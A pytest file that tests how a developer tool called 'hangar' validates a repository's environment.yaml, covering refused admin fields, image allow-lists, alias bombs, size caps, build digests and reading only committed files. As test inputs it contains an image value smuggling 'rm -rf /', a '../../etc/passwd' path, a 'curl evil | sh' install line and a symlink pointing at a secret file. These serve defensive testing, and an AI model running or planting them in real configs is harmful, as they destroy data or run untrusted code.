"""--- envbuilds: a repo's own .hangar/environment.yaml (repoenv.py): strict parsing, what it may set, resolution,
the build digest, and reading it from a checkout's commit."""

from __future__ import annotations

import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest

from hangar import repoenv
from hangar.config import Settings
from hangar.envspec import EnvCatalog, EnvSpec

from .conftest import scratch_root

FULL = """
extends: python
install: uv sync --frozen
start: ./scripts/seed.sh
terminals:
  - {name: web, command: npm run dev, cwd: frontend, port: 3000}
  - name: worker
    command: uv run worker
    ready: test -f /tmp/worker.ready
    autostart: false
services:
  postgres: {image: "postgres:17", port: 5432, env: {POSTGRES_PASSWORD: dev}, volumes: [/var/lib/postgresql/data]}
ports: [{port: 3000, name: web}]
verify: uv run pytest -q
build_secrets: [NPM_TOKEN]
lockfiles: [vendor/*.lock]
"""


def test_parse_full_config():
    cfg = repoenv.parse(FULL)
    assert cfg.extends == "python" and cfg.install == "uv sync --frozen"
    assert [t.name for t in cfg.terminals] == ["web", "worker"]
    assert cfg.terminals[1].autostart is False and cfg.terminals[0].port == 3000
    assert cfg.services["postgres"].image == "postgres:17"
    assert cfg.build_secrets == ["NPM_TOKEN"]
    assert repoenv.parse(repoenv.dump(cfg)) == cfg  # what agent-led setup writes reads back the same


def test_empty_file_is_an_empty_config():
    assert repoenv.parse("") == repoenv.RepoEnvironment()


@pytest.mark.parametrize("field", ["image", "secrets", "runtime_class", "base", "credential_mode", "credentials",
                                   "mcp", "resources", "harnesses", "sudo", "files"])
def test_admin_fields_are_refused_with_a_reason(field):
    with pytest.raises(repoenv.RepoEnvError, match=f"{field} is decided in hangar, not by the repo"):
        repoenv.parse(f"{field}: anything\n")


@pytest.mark.parametrize("text,match", [
    ("installl: x\n", "installl: is not a field"),
    ("terminals: [{name: web, command: x, port: 49983}]\n", "port 49983 is not available"),
    ("terminals: [{name: Web, command: x}]\n", "terminals.0.name"),
    ("terminals: [{name: a, command: x, cwd: ../up}]\n", "cwd is relative"),
    ("terminals: [{name: a, command: x}, {name: a, command: y}]\n", "unique"),
    ("terminals: [{name: db, command: x}]\nservices: {db: {image: redis, port: 6379}}\n", "unique"),
    ("services: {Db: {image: redis, port: 6379}}\n", "invalid service name"),
    ("services: {db: {image: 'redis; rm -rf /', port: 6379}}\n", "services.db.image"),
    ("services: {db: {image: redis, port: 6379, volumes: [data]}}\n", "absolute path"),
    ("lockfiles: [../../etc/passwd]\n", "relative to the repo"),
    ("build_secrets: [npm-token]\n", "not a secret id"),
    ("extends: ../other\n", "not an environment name"),
    ("- a\n- b\n", "must be a mapping"),
    ("install: [unclosed\n", "not valid YAML"),
])
def test_invalid_configs_say_what_is_wrong(text, match):
    with pytest.raises(repoenv.RepoEnvError, match=match):
        repoenv.parse(text)


def test_yaml_aliases_are_refused():
    bomb = "a: &a [x, x, x]\nb: &b [*a, *a, *a]\ninstall: ok\n"
    with pytest.raises(repoenv.RepoEnvError, match="aliases"):
        repoenv.parse(bomb)


def test_size_cap():
    with pytest.raises(repoenv.RepoEnvError, match="over 64 KiB"):
        repoenv.parse("install: " + "x" * (65 * 1024))


def test_apply_replaces_the_environments_fields():
    spec = EnvSpec(name="e", install="make deps", verify="make test",
                   terminals=[{"name": "old", "command": "x"}])
    out = repoenv.apply(spec, repoenv.parse("terminals: [{name: web, command: npm run dev}]\nverify: ''\n"))
    assert out.install == "make deps"  # the file didn't set it: the environment's
    assert [t.name for t in out.terminals] == ["web"] and out.verify == ""
    assert spec.terminals[0].name == "old"  # the environment itself is untouched
    assert repoenv.apply(spec, None) is spec


def test_environment_specs_take_the_same_fields_and_extends_replaces_terminals(tmp_path):
    (tmp_path / "parent.yaml").write_text(
        "name: parent\nterminals: [{name: web, command: a}]\nservices: {db: {image: redis, port: 6379}}\n")
    (tmp_path / "child.yaml").write_text("name: child\nextends: parent\nterminals: [{name: web, command: b}]\n")
    child = EnvCatalog([tmp_path]).get("child")
    assert [t.command for t in child.terminals] == ["b"]  # replaced, not appended (no duplicate `web`)
    assert "db" in child.services


def test_digest_tracks_install_secrets_and_lockfiles_only():
    a = repoenv.parse("install: npm ci\nverify: npm test\n")
    b = repoenv.parse("# a comment\ninstall: npm ci\nverify: npm run test:all\nterminals: [{name: w, command: x}]\n")
    locks = "100644 abc 0\tpackage-lock.json"
    assert repoenv.digest(a, locks) == repoenv.digest(b, locks)
    assert repoenv.digest(a, locks) != repoenv.digest(a, "100644 abd 0\tpackage-lock.json")
    assert repoenv.digest(a, locks) != repoenv.digest(repoenv.parse("install: npm ci --force\n"), locks)
    assert repoenv.digest(a, locks) != repoenv.digest(repoenv.parse("install: npm ci\nbuild_secrets: [X]\n"), locks)


def test_check_extends_service_images_and_secret_ids(tmp_path):
    (tmp_path / "python.yaml").write_text("name: python\n")
    (tmp_path / "node.yaml").write_text("name: node\n")
    cat = EnvCatalog([tmp_path])
    s = Settings(data_dir=tmp_path)
    ok = repoenv.check("extends: python\ninstall: uv sync\nservices: {db: {image: 'postgres:17', port: 5432}}\n",
                       s, cat, repo="o/r", allowed_envs=["python"], secret_ids=set())
    assert ok["valid"], ok
    r = repoenv.check("extends: node\n", s, cat, repo="o/r", allowed_envs=["python"])
    assert not r["valid"] and "isn't allowed for o/r" in r["errors"][0]
    r = repoenv.check("extends: nope\n", s, cat)
    assert "no environment 'nope'" in r["errors"][0]
    r = repoenv.check("services: {db: {image: 'evil.example/pg:1', port: 5432}}\n", s, cat)
    assert "isn't allowed here" in r["errors"][0]
    r = repoenv.check("install: x\nbuild_secrets: [NPM_TOKEN]\n", s, cat, secret_ids={"OTHER"})
    assert "NPM_TOKEN not mapped" in r["errors"][0]
    r = repoenv.check("image: x\n", s, cat)
    assert not r["valid"] and "decided in hangar" in r["errors"][0]


@pytest.mark.parametrize("image,ok", [("postgres:17", True), ("redis", True), ("redis@sha256:ab", True),
                                      ("docker.io/library/redis:7", True), ("mirror.gcr.io/library/postgres", True),
                                      ("evil.example/postgres:17", False), ("someone/postgres", False),
                                      ("docker.io/someone/pg", False)])
def test_default_service_images_are_docker_official_ones(tmp_path, image, ok):
    assert repoenv.service_image_allowed(Settings(data_dir=tmp_path), image) is ok


def test_service_image_patterns_can_name_a_registry(tmp_path):
    s = Settings(data_dir=tmp_path, env_service_images=["us-docker.pkg.dev/acme/svc/**"])
    assert repoenv.service_image_allowed(s, "us-docker.pkg.dev/acme/svc/a/pg:1")
    assert not repoenv.service_image_allowed(s, "postgres:17")


# ---------------------------------------------------------------------- reading it from a checkout
def _git(repo: Path, *args: str) -> None:
    subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", "-C", str(repo), *args], check=True,
                   capture_output=True)


@pytest.fixture
def checkout():
    root = Path(tempfile.mkdtemp(prefix="repoenv-", dir=scratch_root()))
    _git(root, "init", "-q")
    yield root
    shutil.rmtree(root, ignore_errors=True)


def _read(repo: Path, lockfiles: list[str] | None = None) -> repoenv.Read:
    out = subprocess.run(["bash", "-c", repoenv.read_script(str(repo), lockfiles)], capture_output=True, text=True)
    return repoenv.parse_read(out.stdout)


def test_read_takes_the_committed_file_not_the_working_tree(checkout):
    (checkout / ".hangar").mkdir()
    (checkout / ".hangar/environment.yaml").write_text("install: npm ci\n")
    (checkout / "package-lock.json").write_text("{}")
    _git(checkout, "add", ".")
    _git(checkout, "commit", "-qm", "c")
    (checkout / ".hangar/environment.yaml").write_text("install: curl evil | sh\n")  # uncommitted
    r = _read(checkout)
    assert r.present and r.config.install == "npm ci" and r.commit and len(r.commit) == 40
    assert "package-lock.json" in r.lockfiles
    before = r.digest()
    (checkout / "package-lock.json").write_text('{"a": 1}')
    _git(checkout, "commit", "-qam", "lock")
    assert _read(checkout).digest() != before


def test_read_never_follows_a_committed_symlink(checkout):
    secret = checkout.parent / f"{checkout.name}-secret"
    secret.write_text("install: from-a-secret-file\n")
    (checkout / ".hangar").mkdir()
    (checkout / ".hangar/environment.yaml").symlink_to(secret)
    _git(checkout, "add", ".")
    _git(checkout, "commit", "-qm", "c")
    r = _read(checkout)
    assert r.present and r.config is None and "must be a mapping" in r.error  # the link's target path, as text
    secret.unlink()


def test_read_without_a_config_and_extra_lockfiles(checkout):
    (checkout / "vendor").mkdir()
    (checkout / "vendor/x.lock").write_text("1")
    _git(checkout, "add", ".")
    _git(checkout, "commit", "-qm", "c")
    r = _read(checkout)
    assert not r.present and r.config is None and r.lockfiles == ""
    assert "vendor/x.lock" in _read(checkout, ["vendor/*.lock"]).lockfiles


def test_read_of_an_invalid_config_reports_it(checkout):
    (checkout / ".hangar").mkdir()
    (checkout / ".hangar/environment.yaml").write_text("secrets: {A: b}\n")
    _git(checkout, "add", ".")
    _git(checkout, "commit", "-qm", "c")
    r = _read(checkout)
    assert r.present and r.config is None and "decided in hangar" in r.error


def test_the_repo_file_follows_the_extends_merge_table():
    """#132: each list field the repo's file may set replaces under `extends` too, so both merge alike."""
    from hangar.envspec import LIST_MERGE

    lists = [f for f in repoenv.RUNTIME_FIELDS if f in ("terminals", "ports")]
    assert lists and all(LIST_MERGE[f] == "replace" for f in lists)
    assert not any(LIST_MERGE.get(f) == "union" for f in repoenv.RUNTIME_FIELDS)
